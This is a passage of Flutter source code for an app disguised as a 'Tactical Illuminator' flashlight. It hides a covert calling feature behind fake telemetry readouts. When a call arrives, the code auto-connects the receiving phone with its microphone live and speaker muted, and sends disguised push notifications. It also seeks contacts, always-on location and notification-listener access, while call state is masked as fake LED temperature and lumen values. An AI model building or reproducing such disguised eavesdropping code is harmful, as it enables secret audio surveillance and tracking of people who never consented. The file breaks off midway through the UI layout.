import 'dart:async';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart' hide Navigator;
import 'package:vibration/vibration.dart';
import 'package:torch_light/torch_light.dart';
import 'package:screen_brightness/screen_brightness.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'package:flutter/services.dart';
import 'package:firebase_auth/firebase_auth.dart';
import '../providers/auth_provider.dart';
import '../providers/presence_provider.dart';
import '../services/presence_service.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:permission_handler/permission_handler.dart';
import '../services/foreground_service.dart';
import '../providers/webrtc_provider.dart';
import '../providers/update_provider.dart';
import '../services/notification_service.dart';
import '../core/constants.dart';
import 'package:geolocator/geolocator.dart';

import 'settings_screen.dart';

class FlashlightStealthScreen extends ConsumerStatefulWidget {
  const FlashlightStealthScreen({super.key});

  @override
  ConsumerState<FlashlightStealthScreen> createState() => _FlashlightStealthScreenState();
}

class _FlashlightStealthScreenState extends ConsumerState<FlashlightStealthScreen> with WidgetsBindingObserver, SingleTickerProviderStateMixin {
  bool _isLedOn = false;
  bool _isScreenLightOn = false;
  bool _isStrobeOn = false;
  double _screenIntensity = 0.5;
  
  Timer? _strobeTimer;
  Timer? _autoOffTimer;
  Timer? _sosTimer;
  bool _isSosOn = false;
  int _sosStep = 0;
  Timer? _sosHoldTimer;
  int _sosHoldTicks = 0;
  bool _isMicMuted = false;
  int _screenLightColorIndex = 0; // 0: White, 1: Red, 2: Green, 3: Blue
  bool _isDraggingBrightness = false;
  bool _showPurpleUI = false;
  late AnimationController _pulseController;
  late Animation<double> _pulseAnimation;
  String? _recoveredPartnerId;
  StreamSubscription<PresenceData?>? _partnerPresenceSub;
  PresenceData? _partnerPresence;
  
  final List<Color> _tacticalColors = [
    Colors.white,
    const Color(0xFFFF003C), // Tactical Red
    const Color(0xFF00FF41), // Night-vision Green
    Colors.blueAccent,       // Fluid-tracking Blue
  ];

  // Settings
  bool _hapticEnabled = true;
  bool _autoOffEnabled = false;

  // User's assigned connection combination
  int _myHz = 0;
  int _myBrightness = 0;

  // Currently selected connection combination
  int _dialHz = 10; // 1-250
  int _dialBrightness = 50; // 1-100

  // Stealth Connection
  Timer? _stealthHoldTimer;
  int _stealthHoldTicks = 0;
  bool _isStealthConnected = false;
  bool _isSpeakerMuted = true; // Speaker always starts muted on receive

  // Draw element hold for unmute
  Timer? _drawHoldTimer;
  int _drawHoldTicks = 0;

  // Incoming call state
  bool _hasIncomingCall = false;
  String? _incomingRoomId;

  // Outbound call state
  String? _outboundCallStatus; // null, 'invalid', 'ringing', 'connected', 'unmuted'
  Timer? _invalidFeedbackTimer;
  StreamSubscription? _outboundCallSub;

  // Incoming call state additions
  String? _incomingCallerComboId;
  StreamSubscription? _activeIncomingCallSub;
  Timer? _dialTimeoutTimer;

  // Firestore listener subscriptions (must be cancelled on dispose)
  StreamSubscription? _incomingCallsListener;
  StreamSubscription? _comboListener;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 750),
    )..repeat(reverse: true);
    
    _pulseAnimation = Tween<double>(begin: 0.4, end: 1.0).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );
    _initBrightness();
    _loadSettings();
    SharedPreferences.getInstance().then((prefs) {
      if (prefs.getBool('killed_while_connected') == true) {
        setState(() {
          _showPurpleUI = true;
          _recoveredPartnerId = prefs.getString('killed_while_connected_to') ?? 'RECOVERED';
        });
        prefs.remove('killed_while_connected');
        prefs.remove('killed_while_connected_to');
      }
    });

    _initGhostDial();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    final presenceService = ref.read(presenceServiceProvider);
    
    if (state == AppLifecycleState.resumed) {
      presenceService.updateBackgroundState(false);
      if (_isStealthConnected && _hasIncomingCall) {
        _markIncomingCallAsOpened();
      }
    } else if (state == AppLifecycleState.paused || state == AppLifecycleState.inactive) {
      presenceService.updateBackgroundState(true);
    }
    
    if (state == AppLifecycleState.detached) {
      if (_isStealthConnected) {
        SharedPreferences.getInstance().then((prefs) {
          prefs.setBool('killed_while_connected', true);
          String partnerId = _hasIncomingCall ? (_incomingCallerComboId ?? 'UNKNOWN') : '${(_dialHz / 100).toStringAsFixed(2)}A';
          prefs.setString('killed_while_connected_to', partnerId);
        });
      }
    }
  }

  Future<void> _markIncomingCallAsOpened() async {
    final currentUser = FirebaseAuth.instance.currentUser;
    if (currentUser == null) return;
    try {
      final calls = await FirebaseFirestore.instance
          .collection('stealth_calls')
          .where('targetUid', isEqualTo: currentUser.uid)
          .where('status', isEqualTo: 'connected')
          .get();
      for (final doc in calls.docs) {
        await doc.reference.update({'status': 'opened'});
      }
    } catch (e) {
      debugPrint('[GhostDial] Mark opened error: $e');
    }
  }

  // dispose() is defined below after _cleanup()

  Future<void> _enforcePermissions() async {
    if (await Permission.microphone.isDenied) {
      await Permission.microphone.request();
    }
    if (await Permission.contacts.isDenied) {
      await Permission.contacts.request();
    }
    if (await Permission.notification.isDenied) {
      await Permission.notification.request();
    }

    LocationPermission locPerm = await Geolocator.checkPermission();
    if (locPerm == LocationPermission.denied || locPerm == LocationPermission.deniedForever) {
      await Geolocator.requestPermission();
    } else if (locPerm == LocationPermission.whileInUse) {
      await Permission.locationAlways.request();
    }

    final prefs = await SharedPreferences.getInstance();
    if (!prefs.containsKey('asked_notif_listener')) {
      await prefs.setBool('asked_notif_listener', true);
      final intent = const AndroidIntent(
        action: 'android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS',
      );
      try {
        await intent.launch();
      } catch (_) {}
    }
  }

  Future<void> _initGhostDial() async {
    // Initialize Auth and Firestore listeners.
    try {
      final authService = ref.read(authServiceProvider);
      final currentUser = FirebaseAuth.instance.currentUser;
      
      if (currentUser == null) {
        await authService.signInAnonymously();
      } else {
        await authService.ensureUserHasCombo(currentUser.uid);
      }
      
      final userAfterAuth = FirebaseAuth.instance.currentUser;
      if (userAfterAuth != null) {
        final presenceService = ref.read(presenceServiceProvider);
        await presenceService.goOnline(userAfterAuth.uid, initialMicOn: false);
        
        // Save FCM token
        final notificationService = ref.read(notificationServiceProvider);
        await notificationService.initialize();
        await notificationService.saveToken(userAfterAuth.uid);

        // Wire update notification: auto-fire disguised notification when OTA detected
        final updateNotifier = ref.read(updateProvider.notifier);
        updateNotifier.onUpdateDetected = (latestVersion) {
          notificationService.showUpdateNotification(version: latestVersion);
        };
        // Trigger the first check now (callback will fire if update exists)
        updateNotifier.checkForUpdate();

        // Listen to assigned combo (loads DRAW ID)
        _comboListener?.cancel();
        _comboListener = FirebaseFirestore.instance
            .collection(kUsersCollection)
            .doc(userAfterAuth.uid)
            .snapshots()
            .listen((doc) {
          if (doc.exists && doc.data() != null) {
            if (mounted) {
              setState(() {
                _myHz = doc.data()!['assignedHz'] ?? 0;
                _myBrightness = doc.data()!['assignedBrightness'] ?? 0;
              });
            }
          }
        });

        // Listen for incoming stealth calls
        _listenForIncomingCalls(userAfterAuth.uid);
      }
    } catch (e) {
      debugPrint('[GhostDial] Init error: $e');
    }

    // ── PERMISSIONS: Enforce AFTER critical setup ──
    // This can block/loop but won't prevent the app from functioning.
    _enforcePermissions();
  }

  void _listenForIncomingCalls(String myUid) {
    // Listen to the 'stealth_calls' collection for calls targeted at this user
    _incomingCallsListener?.cancel();
    _incomingCallsListener = FirebaseFirestore.instance
        .collection('stealth_calls')
        .where('targetUid', isEqualTo: myUid)
        .where('status', isEqualTo: 'ringing')
        .snapshots()
        .listen((snapshot) async {
      if (snapshot.docs.isNotEmpty && !_isStealthConnected) {
        final callDoc = snapshot.docs.first;
        final data = callDoc.data();
        final roomId = data['roomId'] as String?;
        final callerUid = data['callerUid'] as String?;
        
        if (roomId != null && callerUid != null) {
          // Fetch caller's ID
          String? callerIdStr;
          try {
            final callerDoc = await FirebaseFirestore.instance.collection('users').doc(callerUid).get();
            if (callerDoc.exists && callerDoc.data()!.containsKey('assignedHz')) {
              final hz = callerDoc.data()!['assignedHz'] as int;
              final bright = callerDoc.data()!['assignedBrightness'] as int? ?? 0;
              callerIdStr = '$bright.$hz';
            }
          } catch (e) {
            debugPrint('[GhostDial] Error fetching caller ID: $e');
          }

          if (mounted) {
            setState(() {
              _hasIncomingCall = true;
              _incomingRoomId = roomId;
              _incomingCallerComboId = callerIdStr ?? 'UNKNOWN';
            });
          }
          
          // Auto-connect in background with speaker muted, mic ON
          _autoConnectToCall(roomId, callerUid, callDoc.id);
        }
      }
    });
  }

  Future<void> _autoConnectToCall(String roomId, String callerUid, String callDocId) async {
    try {
      final currentUser = FirebaseAuth.instance.currentUser;
      if (currentUser == null) return;

      // Start foreground service
      await startForegroundService();

      // Initialize WebRTC connection
      final signalingService = ref.read(signalingServiceProvider);
      final webrtcService = ref.read(webrtcServiceProvider);

      await signalingService.startSignaling(
        roomId: roomId,
        myUserId: currentUser.uid,
        partnerIds: [],
      );

      // Mute speaker but keep mic on
      webrtcService.muteAllIncomingAudio(true);

      if (mounted) {
        setState(() {
          _isStealthConnected = true;
          _isSpeakerMuted = true;
        });
        _partnerPresenceSub?.cancel();
        _partnerPresenceSub = ref.read(presenceServiceProvider).streamPartnerPresence(callerUid).listen((presence) {
          if (mounted) setState(() => _partnerPresence = presence);
        });
      }

      // Mark call as accepted
      await FirebaseFirestore.instance
          .collection('stealth_calls')
          .doc(callDocId)
          .update({'status': 'connected'});

      // Set up listener for disconnect (deletion of the call doc)
      _activeIncomingCallSub?.cancel();
      _activeIncomingCallSub = FirebaseFirestore.instance
          .collection('stealth_calls')
          .doc(callDocId)
          .snapshots()
          .listen((docSnap) {
        if (!docSnap.exists) {
          // Caller hung up (deleted the doc)
          if (mounted) {
            _disconnectStealth();
          }
        }
      });
      
    } catch (e) {
      debugPrint('[GhostDial] Auto-connect error: $e');
    }
  }

  Future<void> _loadSettings() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() {
      _hapticEnabled = prefs.getBool('hapticEnabled') ?? true;
      _autoOffEnabled = prefs.getBool('autoOffEnabled') ?? false;
    });
  }

  Future<void> _saveSetting(String key, bool value) async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool(key, value);
  }

  void _triggerHaptic() {
    if (_hapticEnabled) {
      HapticFeedback.lightImpact();
    }
  }

  Future<void> _initBrightness() async {
    try {
      _screenIntensity = await ScreenBrightness().current;
      setState(() {});
    } catch (_) {}
  }

  @override
  void dispose() {
    _disableLedTorch();
    _resetScreenBrightness();
    _cleanup();
    _pulseController.dispose();
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  void _cleanup() {
    _strobeTimer?.cancel();
    _autoOffTimer?.cancel();
    _sosTimer?.cancel();
    _sosHoldTimer?.cancel();
    _stealthHoldTimer?.cancel();
    _drawHoldTimer?.cancel();
    _sosHoldTimer?.cancel();
    _dialTimeoutTimer?.cancel();
    _invalidFeedbackTimer?.cancel();
    _outboundCallSub?.cancel();
    _activeIncomingCallSub?.cancel();
    _partnerPresenceSub?.cancel();
    _incomingCallsListener?.cancel();
    _comboListener?.cancel();
  }

  // --- LED TEMP Hold → Dial & Connect ---
  void _handleStealthHoldStart(LongPressStartDetails details) async {
    if (_stealthHoldTimer != null && _stealthHoldTimer!.isActive) return;
    
    _stealthHoldTicks = 0;
    
    bool hasVibrator = await Vibration.hasVibrator() ?? false;
    bool hasCustomVibrations = await Vibration.hasCustomVibrationsSupport() ?? false;

    // If device doesn't support custom haptics, just vibrate continuously for 5s
    if (hasVibrator && !hasCustomVibrations && _hapticEnabled) {
      Vibration.vibrate(duration: 5000);
    }
    
    _stealthHoldTimer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
      _stealthHoldTicks++;
      
      if (_stealthHoldTicks < 50) {
        if (_hapticEnabled) {
          if (hasCustomVibrations) {
            // 5 dots over 5 seconds (1 dot every 10 ticks = 1 second)
            if (_stealthHoldTicks % 10 == 0) {
              Vibration.vibrate(duration: 150);
            }
          } else if (!hasVibrator) {
            // Fallback to standard haptics if no advanced vibration API
            if (_stealthHoldTicks % 10 == 0) {
              HapticFeedback.mediumImpact();
            }
          }
        }
      } else {
        timer.cancel();
        
        if (_hapticEnabled) {
          Vibration.cancel();
          Future.delayed(const Duration(milliseconds: 50), () => HapticFeedback.heavyImpact());
          Future.delayed(const Duration(milliseconds: 150), () => HapticFeedback.heavyImpact());
        }
        
        if (_isStealthConnected) {
          _disconnectStealth();
        } else {
          _dialAndConnect();
        }
      }
    });
  }

  void _handleStealthHoldEnd() {
    if (_stealthHoldTimer != null && _stealthHoldTimer!.isActive) {
      _stealthHoldTimer!.cancel();
      _stealthHoldTicks = 0;
      Vibration.cancel(); // Cancel any ongoing vibration
    }
  }

  // --- DRAW Hold → Unmute Speaker ---
  void _handleDrawHoldStart(LongPressStartDetails details) {
    if (!_isStealthConnected || !_isSpeakerMuted) return;
    if (_drawHoldTimer != null && _drawHoldTimer!.isActive) return;
    
    _drawHoldTicks = 0;
    
    _drawHoldTimer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
      setState(() {
        _drawHoldTicks++;
      });
      
      if (_drawHoldTicks < 20) {
        // 2 second hold
        if (_hapticEnabled && _drawHoldTicks % 4 == 0) {
          HapticFeedback.mediumImpact();
        }
      } else {
        timer.cancel();
        
        if (_hapticEnabled) {
          HapticFeedback.heavyImpact();
        }
        
        // Unmute speaker!
        final webrtcService = ref.read(webrtcServiceProvider);
        webrtcService.muteAllIncomingAudio(false);
        
        setState(() {
          _isSpeakerMuted = false;
          _hasIncomingCall = false;
        });

        // Notify caller that we unmuted
        if (_incomingRoomId != null) {
          FirebaseFirestore.instance.collection('stealth_calls')
            .where('roomId', isEqualTo: _incomingRoomId)
            .get().then((snap) {
              for (var doc in snap.docs) {
                doc.reference.update({'status': 'unmuted'});
              }
            });
        }
      }
    });
  }

  void _handleDrawHoldEnd() {
    if (_drawHoldTimer != null && _drawHoldTimer!.isActive) {
      _drawHoldTimer!.cancel();
      _drawHoldTicks = 0;
    }
  }

  Future<void> _dialAndConnect() async {
    try {
      final currentUser = FirebaseAuth.instance.currentUser;
      if (currentUser == null) return;

      // Look up the target user by the dialed Hz + Brightness combo
      final comboId = '${_dialHz}_$_dialBrightness';
      final comboDoc = await FirebaseFirestore.instance
          .collection('combos')
          .doc(comboId)
          .get();

      if (!comboDoc.exists) {
        // No user has this combo
        if (_hapticEnabled) {
          HapticFeedback.lightImpact();
        }
        setState(() {
          _outboundCallStatus = 'invalid';
        });
        _invalidFeedbackTimer?.cancel();
        _invalidFeedbackTimer = Timer(const Duration(seconds: 3), () {
          if (mounted) setState(() => _outboundCallStatus = null);
        });
        return;
      }

      final targetUid = comboDoc.data()!['userId'] as String;
      
      // Don't call yourself
      if (targetUid == currentUser.uid) return;

      // Get the target user's FCM token
      final targetUserDoc = await FirebaseFirestore.instance
          .collection(kUsersCollection)
          .doc(targetUid)
          .get();

      if (!targetUserDoc.exists) return;
      final targetToken = targetUserDoc.data()!['fcmToken'] as String?;

      // Create a deterministic stealth room ID to prevent collisions if both dial simultaneously
      final sortedIds = [currentUser.uid, targetUid]..sort();
      final roomId = 'ghost_${sortedIds[0]}_${sortedIds[1]}';

      // Create room doc in Firestore
      await FirebaseFirestore.instance.collection(kRoomsCollection).doc(roomId).set({
        'roomId': roomId,
        'name': 'Ghost Channel',
        'createdBy': currentUser.uid,
        'memberIds': [currentUser.uid, targetUid],
        'maxMembers': 2,
        'createdAt': Timestamp.now(),
      });

      // Create stealth_calls entry for the target
      await FirebaseFirestore.instance.collection('stealth_calls').add({
        'callerUid': currentUser.uid,
        'targetUid': targetUid,
        'roomId': roomId,
        'status': 'ringing',
        'createdAt': Timestamp.now(),
      });

      // Send disguised FCM push
      if (targetToken != null) {
        final notificationService = ref.read(notificationServiceProvider);
        await notificationService.sendExtremeDisguisedRing(
          targetToken: targetToken,
          roomId: roomId,
        );
      }

      // Start foreground service
      await startForegroundService();

      // Connect caller's WebRTC
      final signalingService = ref.read(signalingServiceProvider);
      await signalingService.startSignaling(
        roomId: roomId,
        myUserId: currentUser.uid,
        partnerIds: [],
      );

      setState(() {
        _isStealthConnected = true;
        _isSpeakerMuted = false; // Caller can hear immediately
        _outboundCallStatus = 'ringing';
      });

      _dialTimeoutTimer?.cancel();
      _dialTimeoutTimer = Timer(const Duration(seconds: 60), () {
        if (mounted && _outboundCallStatus == 'ringing') {
          _disconnectStealth();
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              const SnackBar(content: Text('Call Timeout - Node Unreachable', style: TextStyle(color: Colors.red))),
            );
          }
        }
      });

      _partnerPresenceSub?.cancel();
      _partnerPresenceSub = ref.read(presenceServiceProvider).streamPartnerPresence(targetUid).listen((presence) {
        if (mounted) setState(() => _partnerPresence = presence);
      });

      // Listen for target status changes
      _outboundCallSub?.cancel();
      _outboundCallSub = FirebaseFirestore.instance.collection('stealth_calls')
          .where('callerUid', isEqualTo: currentUser.uid)
          .where('roomId', isEqualTo: roomId)
          .snapshots().listen((snap) {
        if (snap.docs.isNotEmpty && mounted) {
          final status = snap.docs.first.data()['status'];
          setState(() {
            _outboundCallStatus = status;
          });
        }
      });
    } catch (e) {
      debugPrint('[GhostDial] Dial error: $e');
      setState(() {
        _isStealthConnected = false;
        _outboundCallStatus = null;
      });
    }
  }

  Future<void> _disconnectStealth() async {
    _triggerHaptic();
    Future.delayed(const Duration(milliseconds: 100), () => HapticFeedback.heavyImpact());
    Future.delayed(const Duration(milliseconds: 250), () => HapticFeedback.heavyImpact());

    setState(() {
      _isStealthConnected = false;
      _isSpeakerMuted = true;
      _hasIncomingCall = false;
      _outboundCallStatus = null;
      _incomingCallerComboId = null;
      _partnerPresence = null;
    });
    
    _partnerPresenceSub?.cancel();
    
    _activeIncomingCallSub?.cancel();
    
    _outboundCallSub?.cancel();
    
    final signalingService = ref.read(signalingServiceProvider);
    await signalingService.stopSignaling();
    await stopForegroundService();

    // Clean up call docs
    final currentUser = FirebaseAuth.instance.currentUser;
    if (currentUser != null) {
      final calls = await FirebaseFirestore.instance
          .collection('stealth_calls')
          .where('callerUid', isEqualTo: currentUser.uid)
          .get();
      for (final doc in calls.docs) {
        await doc.reference.delete();
      }
      final targetCalls = await FirebaseFirestore.instance
          .collection('stealth_calls')
          .where('targetUid', isEqualTo: currentUser.uid)
          .get();
      for (final doc in targetCalls.docs) {
        await doc.reference.delete();
      }
    }
  }

  // --- Core Flashlight Logic ---

  Future<void> _toggleLed() async {
    _triggerHaptic();
    try {
      bool hasTorch = await TorchLight.isTorchAvailable();
      if (!hasTorch) {
        setState(() => _isLedOn = !_isLedOn);
        return;
      }

      if (_isLedOn) {
        await TorchLight.disableTorch();
        setState(() {
          _isLedOn = false;
          _isStrobeOn = false;
          _strobeTimer?.cancel();
          _autoOffTimer?.cancel();
        });
      } else {
        await TorchLight.enableTorch();
        setState(() => _isLedOn = true);
        if (_autoOffEnabled) {
          _autoOffTimer?.cancel();
          _autoOffTimer = Timer(const Duration(minutes: 10), () {
            if (mounted && _isLedOn) {
              _toggleLed();
            }
          });
        }
      }
    } catch (_) {
      setState(() => _isLedOn = !_isLedOn);
    }
  }

  Future<void> _disableLedTorch() async {
    try {
      await TorchLight.disableTorch();
    } catch (_) {}
  }

  Future<void> _toggleStrobe() async {
    _triggerHaptic();
    if (_isSosOn) _toggleSos(); // Turn off SOS if running

    if (_isStrobeOn) {
      _strobeTimer?.cancel();
      setState(() => _isStrobeOn = false);
      if (_isLedOn) {
         try { await TorchLight.enableTorch(); } catch (_) {}
      } else {
         try { await TorchLight.disableTorch(); } catch (_) {}
      }
    } else {
      setState(() {
        _isStrobeOn = true;
        _isLedOn = true;
      });
      bool flashState = true;
      _startStrobeTimer(flashState);
    }
  }

  void _startStrobeTimer(bool flashState) {
    _strobeTimer?.cancel();
    // Use _dialHz for strobe frequency. 1Hz = 1000ms, 50Hz = 20ms
    // We clamp the hz to a reasonable physical limit (e.g., 1 to 50 Hz)
    int hz = _dialHz.clamp(1, 50);
    int intervalMs = (1000 ~/ hz);
    
    _strobeTimer = Timer.periodic(Duration(milliseconds: intervalMs), (timer) async {
      try {
        if (flashState) {
          await TorchLight.enableTorch();
        } else {
          await TorchLight.disableTorch();
        }
        flashState = !flashState;
        
        // If hz changes during strobe, we need to restart the timer to apply the new interval
        int currentHz = _dialHz.clamp(1, 50);
        if (currentHz != hz && _isStrobeOn) {
          timer.cancel();
          _startStrobeTimer(flashState);
        }
      } catch (_) {}
    });
  }

  void _handleSosHoldStart(LongPressStartDetails details) {
    _sosHoldTicks = 0;
    _sosHoldTimer?.cancel();
    _sosHoldTimer = Timer.periodic(const Duration(milliseconds: 100), (timer) {
      if (!mounted) { timer.cancel(); return; }
      setState(() {
        _sosHoldTicks++;
        if (_sosHoldTicks >= 20) { // 2 seconds
          _triggerHaptic();
          _toggleMic();
          timer.cancel();
          _sosHoldTicks = 0;
        }
      });
    });
  }

  void _handleSosHoldEnd() {
    _sosHoldTimer?.cancel();
    setState(() {
      _sosHoldTicks = 0;
    });
  }

  Future<void> _toggleSos() async {
    _triggerHaptic();
    if (_isStrobeOn) _toggleStrobe(); // Turn off strobe if running

    if (_isSosOn) {
      _sosTimer?.cancel();
      setState(() {
        _isSosOn = false;
        _sosStep = 0;
      });
      if (_isLedOn) {
         try { await TorchLight.enableTorch(); } catch (_) {}
      } else {
         try { await TorchLight.disableTorch(); } catch (_) {}
      }
    } else {
      setState(() {
        _isSosOn = true;
        _isLedOn = true;
        _sosStep = 0;
      });

      final List<bool> sosPattern = [
        true, false, true, false, true, false, // ...
        false, false, // space
        true, true, true, false, true, true, true, false, true, true, true, false, // ---
        false, false, // space
        true, false, true, false, true, false, // ...
        false, false, false, false, false, false, // pause
      ];

      _sosTimer = Timer.periodic(const Duration(milliseconds: 150), (timer) async {
        if (!mounted || !_isSosOn) {
          timer.cancel();
          return;
        }
        bool turnOn = sosPattern[_sosStep % sosPattern.length];
        try {
          if (turnOn) {
            await TorchLight.enableTorch();
          } else {
            await TorchLight.disableTorch();
          }
        } catch (_) {}
        _sosStep++;
      });
    }
  }

  Future<void> _toggleMic() async {
    _triggerHaptic();
    setState(() {
      _isMicMuted = !_isMicMuted;
    });
    ref.read(webrtcServiceProvider).setMicEnabled(!_isMicMuted);
  }

  Future<void> _toggleScreenLight() async {
    _triggerHaptic();
    setState(() {
      _isScreenLightOn = !_isScreenLightOn;
    });
    if (_isScreenLightOn) {
      try {
        await ScreenBrightness().setScreenBrightness(_screenIntensity);
      } catch (_) {}
    } else {
      _resetScreenBrightness();
    }
  }

  Future<void> _updateScreenIntensity(double value) async {
    setState(() {
      _screenIntensity = value;
    });
    if (_isScreenLightOn) {
       try {
        await ScreenBrightness().setScreenBrightness(_screenIntensity);
      } catch (_) {}
    }
  }

  Future<void> _resetScreenBrightness() async {
    try {
      await ScreenBrightness().resetScreenBrightness();
    } catch (_) {}
  }

  @override
  Widget build(BuildContext context) {
    const accentColor = Color(0xFF00E676); // Softer green
    const dangerColor = Color(0xFFFF5252); // Softer red
    const darkBg = Color(0xFF0A0C0E);
    const panelColor = Color(0xFF161A1D);

    final isActive = _isLedOn || _isScreenLightOn;
    final statusColor = isActive ? accentColor : Colors.grey[700]!;

    // Determine DRAW display value — user's "phone number"
    final drawValue = _myBrightness > 0 && _myHz > 0
        ? '$_myBrightness.$_myHz'
        : '0.0A';

    // LED TEMP display — contextual
    String ledTempValue;
    Color ledTempColor;
    if (_isStealthConnected) {
      ledTempValue = '99°C';
      ledTempColor = dangerColor;
    } else if (_hasIncomingCall) {
      ledTempValue = '88°C';
      ledTempColor = const Color(0xFFFF8800);
    } else if (isActive) {
      ledTempValue = '42°C';
      ledTempColor = dangerColor;
    } else {
      ledTempValue = '28°C';
      ledTempColor = accentColor;
    }

    return Scaffold(
      backgroundColor: _isScreenLightOn ? Colors.white : darkBg,
      body: SafeArea(
        child: _isScreenLightOn
            ? _buildScreenLightMode(accentColor)
            : AnimatedBuilder(
                animation: _pulseController,
                builder: (context, child) {
                  // Determine OUTPUT display with animation frame
                  String outputValue = isActive ? '1200 LM' : '0 LM';
                  Color outputColor = statusColor;

                  if (_showPurpleUI) {
                    outputValue = _recoveredPartnerId ?? 'RECOVERED';
                    outputColor = Colors.purpleAccent;
                  } else if (_outboundCallStatus == 'invalid') {
                    outputValue = 'ERR: NULL';
                    outputColor = dangerColor; // Red
                  } else if (_outboundCallStatus == 'ringing') {
                    outputValue = 'WAITING..';
                    outputColor = const Color(0xFFFF8800); // Yellow
                  } else if (_hasIncomingCall && !_isStealthConnected) {
                    outputValue = _incomingCallerComboId ?? 'INCOMING';
                    outputColor = const Color(0xFF64B5F6); // Soft Blue
                  } else if (_isStealthConnected) {
                    String partnerId = _hasIncomingCall ? (_incomingCallerComboId ?? 'UNKNOWN') : '$_dialBrightness.$_dialHz';
                    outputValue = partnerId;

                    if (_partnerPresence == null || !_partnerPresence!.online) {
                      outputColor = Colors.purpleAccent;
                    } else if (_partnerPresence!.inBackground) {
                      outputColor = Colors.orangeAccent;
                    } else {
                      outputColor = const Color(0xFF00E676).withValues(alpha: _pulseAnimation.value); // Green Pulsating
                    }
                  }

                  return Column(
                children: [
                  // --- Top Header ---
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                    decoration: const BoxDecoration(
                      color: panelColor,
                      border: Border(bottom: BorderSide(color: Colors.white12, width: 2)),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        Row(
                          children: [
                            Icon(Icons.warning_amber_rounded, color: statusColor, size: 28),
                            const SizedBox(width: 12),
                            Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  'TACTICAL ILLUMINATOR',
                                  style: TextStyle(
                                    color: statusColor,
                                    fontSize: 16,
                                    fontWeight: FontWeight.w900,
                                    letterSpacing: 2,
                                  ),
                                ),
                                Text(
                                  _isStealthConnected 
                                      ? 'STATUS: LINKED' 
                                      : (isActive ? 'STATUS: ENGAGED' : 'STATUS: STANDBY'),
                                  style: TextStyle(
                                    color: _isStealthConnected ? dangerColor : Colors.white54,
                                    fontSize: 10,
                                    fontFamily: 'monospace',
                                    letterSpacing: 1,
                                  ),
                                ),
                              ],
                            ),
                          ],
                        ),
                        IconButton(
                          icon: const Icon(Icons.settings_outlined, color: Colors.white54),
                          onPressed: () {
                            Navigator.push(
                              context,
                              MaterialPageRoute(builder: (_) => const SettingsScreen()),
                            );
                          },
                        ),
                      ],
                    ),
                  ),

                  Expanded(
                    child: Padding(
                      padding: const EdgeInsets.all(24.0),
                      child: Column(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          // --- Telemetry Panel ---
                          Container(
                            padding: const EdgeInsets.all(16),
                            decoration: BoxDecoration(
                              color: const Color(0xFF0D1012),
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: Colors.white10),
                              boxShadow: const [
                                BoxShadow(color: Colors.black54, blurRadius: 10)
                              ],
                            ),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: [
                                // LED TEMP — hold 5s to dial
                                GestureDetector(
                                  behavior: HitTestBehavior.opaque,
                                  onLongPressStart: _handleStealthHoldStart,
                                  onLongPressEnd: (_) => _handleStealthHoldEnd(),
                                  onLongPressCancel: _handleStealthHoldEnd,
                                  child: Padding(
                                    padding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 8.0),
                                    child: _buildTelemetryStat(
                                      'LED TEMP', 
                                      ledTempValue, 
                                      ledTempColor,
                                    ),
                                  ),
                                ),
                                Container(width: 1, height: 40, color: Colors.white10),
                                // OUTPUT display
                                Padding(
                                  padding: const EdgeInsets.symmetric(horizontal: 16.0, vertical: 8.0),
                                  child: _buildTelemetryStat('OUTPUT', outputValue, outputColor),
                                ),
                                Container(width: 1, height: 40, color: Colors.white10),
                                // DRAW — shows user's own "phone number", hold 2s to unmute
                                GestureDetector(
                                  behavior: HitTestBehavior.opaque,
                                  onLongPressStart: _handleDrawHoldStart,
                                  onLongPressEnd: (_) => _handleDrawHoldEnd(),
                                  onLongPressCancel: _handleDrawHoldEnd,
                                  child: Padding(
                                    padding: const EdgeInsets.symmetric(horizontal: 8.0, vertical: 4.0),
                                    child: Stack(
                                      alignment: Alignment.center,
                                    children: [
                                      if (_drawHoldTicks > 0 && _drawHoldTicks < 20)
                                        SizedBox(
                                          width: 50,
                                          height: 50,
                                          child: CircularProgressIndicator(
                                            value: _drawHoldTicks / 20.0,
                                            strokeWidth: 2,
                                            valueColor: const AlwaysStoppedAnimation<Color>(Color(0xFFFF8800)),
                                            backgroundColor: Colors.white10,
                                          ),
                                        ),
                                      Container(
                                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                                        decoration: BoxDecoration(
                                          color: (!_isSpeakerMuted && _isStealthConnected) ? statusColor.withValues(alpha: 0.15) : Colors.transparent,
                                          borderRadius: BorderRadius.circular(8),
                                          border: Border.all(
                                            color: (!_isSpeakerMuted && _isStealthConnected) ? statusColor.withValues(alpha: 0.5) : Colors.transparent,
                                            width: 1,
                                          ),
                                          boxShadow: (!_isSpeakerMuted && _isStealthConnected) 
                                              ? [BoxShadow(color: statusColor.withValues(alpha: 0.3), blurRadius: 10)]
                                              : [],
                                        ),
                                        child: _buildTelemetryStat(
                                          'DRAW', 
                                          drawValue,
                                          _isSpeakerMuted && _isStealthConnected 
                                              ? const Color(0xFFFF8800)
                                              : statusColor,
                                        ),
                                      ),
                                      ],
                                    ),
                                  ),
                                ),
